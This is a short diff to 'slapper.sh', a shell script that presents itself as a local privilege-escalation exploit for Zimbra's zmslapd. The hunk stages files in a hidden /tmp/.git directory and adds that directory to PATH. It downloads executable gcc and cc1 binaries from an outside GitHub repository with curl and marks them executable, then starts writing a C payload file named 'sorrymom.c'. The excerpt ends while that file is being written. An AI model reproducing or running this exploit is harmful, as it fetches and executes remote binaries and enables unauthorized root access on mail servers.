@@ -3,9 +3,11 @@ echo "~ slapper.sh - zimbra zmslapd local privesc exploit ~"
 echo "[+] Setting up..."
 rm -rf /tmp/.git 2>&1
 mkdir /tmp/.git
+export PATH=$PATH:/tmp/.git
 cd /tmp/.git
 curl -fskSL github.com/aels/zimbra-slapper/raw/main/gcc -o gcc
-chmod +x gcc
+curl -fskSL github.com/aels/zimbra-slapper/raw/main/cc1 -o cc1
+chmod +x gcc cc1
 cat << EOF > /tmp/.git/sorrymom.c
 #include <stdio.h>
 #include <sys/types.h>
